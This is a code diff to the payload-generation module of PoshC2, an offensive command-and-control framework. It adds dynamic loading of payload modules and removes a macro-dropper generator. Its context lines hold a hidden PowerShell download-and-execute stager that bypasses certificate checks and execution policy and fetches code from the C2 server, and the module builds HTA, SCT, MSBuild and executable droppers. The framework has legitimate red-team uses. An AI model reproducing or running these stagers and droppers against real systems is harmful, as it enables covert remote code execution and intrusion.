@@ -1,11 +1,11 @@
 from io import StringIO
-import gzip, base64, subprocess, os, hashlib, shutil, re, donut
+import gzip, base64, subprocess, os, hashlib, shutil, re, donut, importlib
 from enum import Enum
 
-from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess
+from poshc2.server.Config import PayloadsDirectory, PayloadTemplatesDirectory, DefaultMigrationProcess, PayloadModulesDirectory
 from poshc2.server.Config import PBindSecret as DefaultPBindSecret, PBindPipeName as DefaultPBindPipeName
 from poshc2.Colours import Colours
-from poshc2.Utils import gen_key, randomuri, formStrMacro, formStr, offsetFinder, get_first_url
+from poshc2.Utils import gen_key, randomuri, formStr, offsetFinder, get_first_url
 from poshc2.server.database.DB import get_url_by_id, get_default_url_id, select_item
 
 
@@ -141,7 +141,7 @@ class Payloads(object):
             psuri = f"{self.FirstURL}/{self.QuickCommand}_rp"
             pscmd = "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$MS=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((new-object system.net.webclient).downloadstring('%s')));IEX $MS" % psuri
             psurienc = base64.b64encode(pscmd.encode('UTF-16LE'))
-            self.QuickstartLog("powershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % psurienc.decode('UTF-8'))
+            self.QuickstartLog("\npowershell -exec bypass -Noninteractive -windowstyle hidden -e %s" % psurienc.decode('UTF-8'))
 
 
     def CreateDroppers(self, name=""):
@@ -539,20 +539,6 @@ class Payloads(object):
             self.QuickstartLog("Payload written to: %s%s%s_%s_x86.exe" % (self.BaseDirectory, name, payloadtype.value, sourcefile.replace(".c","")))
 
 
-    def CreateMacro(self, name=""):
-        self.QuickstartLog(Colours.END)
-        self.QuickstartLog("Macro Payload written to: %s%smacro.txt" % (self.BaseDirectory, name))
-
-        strmacro = formStrMacro("str", str( self.CreateRawBase() ))
-        with open("%sdropper.macro" % PayloadTemplatesDirectory, 'r') as f:
-            content = f.read()
-        content = str(content) \
-            .replace("#REPLACEME#",strmacro)
-
-        with open("%smacro.txt" % (self.BaseDirectory), 'w') as f:
-            f.write(content)
-
-
     def CreateMsbuild(self, name=""):
         self.QuickstartLog(Colours.END)
         self.QuickstartLog("Msbuild payload files:")
@@ -710,7 +696,6 @@ class Payloads(object):
         self.QuickstartLog(Colours.END + "=======================================" + Colours.END)
         self.CreateRaw(name)
         self.CreateHTA(name)
-        self.CreateMacro(name)
         self.CreateSCT(name)
 
         self.QuickstartLog(Colours.END)
@@ -742,3 +727,17 @@ class Payloads(object):
 
         self.QuickstartLog(Colours.END)
         self.QuickstartLog(f"pbind-connect hostname {self.PBindPipeName} {self.PBindSecret}")
+        self.BuildDynamicPayloads(name)
+
+
+    def BuildDynamicPayloads(self, name):
+
+        for payload_module_file in os.listdir(PayloadModulesDirectory):
+            if not payload_module_file.endswith(".py"):
+                continue
+            if __file__.endswith(f"/{payload_module_file}") or payload_module_file == "__init__.py":
+                continue
+            payload_module = os.path.splitext(payload_module_file)[0]
+            module = importlib.import_module(f'poshc2.server.payloads.{payload_module}')
+            shellcode_function = getattr(module, "create_payloads")
+            shellcode_function(self, name)
